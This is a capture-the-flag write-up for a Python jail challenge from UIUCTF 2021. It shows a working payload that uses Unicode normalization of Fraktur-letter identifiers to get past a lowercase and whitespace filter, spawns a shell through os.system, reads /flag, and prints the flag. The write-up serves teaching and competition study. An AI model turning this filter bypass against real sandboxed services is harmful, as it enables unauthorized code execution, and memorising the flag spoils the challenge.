# baby_python_fixed - 133 pts, 45 solves

> whoops, I made a typo on the other chal. it's probably impossible, right? Python version is 3.8.10 and flag is at /flag
> 
> nc baby-python-fixed.chal.uiuc.tf 1337
> 
> challenge.py

`baby-python-fixed` was a jail challenge in UIUCTF 2021, where I played with `TeamlessCTF` and got 12th place. I actually got first blood on this challenge!

We start by examining the challenge file:

```python
import re
bad = bool(re.search(r'[a-z\s]', (input := input())))
exec(input) if not bad else print('Input contained bad characters')
exit(bad)
```

Seems pretty minimal. We can see that the challenge checks our input to see if there is any whitespace or lowercase letters, then `exec()`s it if there are none.

The filter is pretty easy to work around, if you know one quirk about python. Python will unicode normalize keywords in code before running, so `𝔭𝔯𝔦𝔫𝔱("Hello World!")` is actually equiv to `print("Hello World!")` We can leverate this to access arbituary keywords. 

However, we also need to access strings, such as "os" and "sh", which will not be unicode normalized. Luckily, uppercase letters are not blacklisted so we are able to get lowercase strings with `"OS".lower()`.

Putting this all together, we can craft a payload:

```
$ nc baby-python-fixed.chal.uiuc.tf 1337
== proof-of-work: disabled ==
__𝔦𝔪  𝔭𝔬𝔯𝔱    __("OS".𝔩𝔬𝔴𝔢    𝔯()). 𝔰𝔶𝔰   𝔱𝔢𝔪(   "SH".𝔩𝔬𝔴   𝔢𝔯()  )
cat /flag
uiuctf{unicode_normalization_is_not_normal_d2f674}
```

Flag: `uiuctf{unicode_normalization_is_not_normal_d2f674}`
